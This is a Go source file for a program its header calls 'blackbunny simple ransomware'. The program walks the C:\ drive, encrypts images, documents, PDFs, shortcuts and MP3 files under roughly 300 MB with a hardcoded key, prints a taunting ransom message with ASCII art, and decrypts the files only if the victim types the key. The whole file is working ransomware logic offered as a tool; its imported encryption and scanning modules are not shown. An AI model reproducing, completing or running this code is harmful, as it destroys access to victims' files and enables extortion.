/*
blackbunny simple ransomware 
written by: amirali rafie
https://github.com/Null-byte-00
version: 0.1.0
*/
package main

import (
	"./src/files"
	"./src/encryption"
	"fmt"
)

func main() {
	key := "password" // the password to encrypt files
	rootdir := "C:\\" // root directory
	fileextentions := []string{"jpg", "png", "pdf", "txt", "doc", "jpeg", "lnk", "docx", "mp3"} // valid files extensions 
	size := 314572800 // maximum file size to encrypt (encryting huge files can decrease encryption speed)
	message := "huhu i have encrypted all of your files enter password to get your files back" // message you want to show when file executes

	f := files.NewFiles(rootdir, fileextentions, size)
	systemfiles, err := f.ScanToencrypt()
	if err != nil {
		fmt.Println(err)
	}
	for _, file := range systemfiles {
		enc := encryption.NewEncryption(file, key)
		enc.Encryptfile()
	}
                           
fmt.Println("\n\n                          bbb          bbb")
fmt.Println("                         bbbbb        bbbbb")
fmt.Println("                        bbbbbbb      bbbbbbb")  
fmt.Println("                       bbbbbbbbb    bbbbbbbbb")  
fmt.Println("                        bbbbbbb      bbbbbbb")  
fmt.Println("                         bbbbb        bbbbb")
fmt.Println("                         bbbbb        bbbbb")
fmt.Println("                          bbbbb      bbbbb")
fmt.Println("                         bbbbbbbbbbbbbbbbbb")
fmt.Println("                        bbbbbbbbbbbbbbbbbbbb")
fmt.Println("                       bbbbb   bbbbbb   bbbbb")
fmt.Println("                      bbbbbbbbbbbbbbbbbbbbbbbb")
fmt.Println("                      bbbbbbbbbbbb bbbbbbbbbbb")
fmt.Println("                      bbbbbbbbbbbbbbbbbbbbbbbb")
fmt.Println("                       bbbbbbbbbbbbbbbbbbbbbb")
fmt.Println("                        bbbbbbbbbbbbbbbbbbbb")
fmt.Println("                         bbbbbbbbbbbbbbbbbb")
fmt.Println("                            bbbbbbbbbbbb")
fmt.Println("                       Black bunny ransomware\n")

	fmt.Println(message)
	fmt.Printf("password:")
	var password string
	fmt.Scanln(&password)
	efs := files.NewFiles(rootdir, fileextentions, size)
	encryptedfiles,_ := efs.ScanTodecrypt()

		if password == key{
			for _, file := range encryptedfiles {
				enc := encryption.NewEncryption(file, key)
				enc.Decryptfile()
			}
			fmt.Println(encryptedfiles)
		} else {
			fmt.Println("failed :(")
			
		}
}